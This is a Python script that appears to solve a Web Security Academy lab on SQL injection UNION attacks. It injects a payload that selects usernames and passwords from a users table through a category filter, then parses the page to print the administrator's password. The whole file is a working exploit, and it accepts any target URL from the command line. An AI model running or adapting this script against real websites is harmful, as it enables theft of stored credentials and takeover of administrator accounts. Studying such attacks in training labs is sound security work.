#SQL injection UNION attack, retrieving data from other tables

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup #pip install beautifulsoup4

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0a5b000c0471216480cc3f1200e60056.web-security-academy.net/'

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION SELECT username, password from users--"
    r = requests.get(url + path +sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print('[+] Found the administrator password')
        soup = BeautifulSoup(r.text, 'html.parser')
        next_td = soup.body.find(text="administrator").find_next('td')
        admin_password = next_td.contents[0] if next_td.contents else ""
        print("[+] password: " + admin_password)
        return True
    else:
        return False
    
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    print('[+] Dumping the list of username and password')

    if exploit_sqli_users_table(url):
        print("[+] SQL injection successful")
    else:
        print("[-] Did not find administrator password")    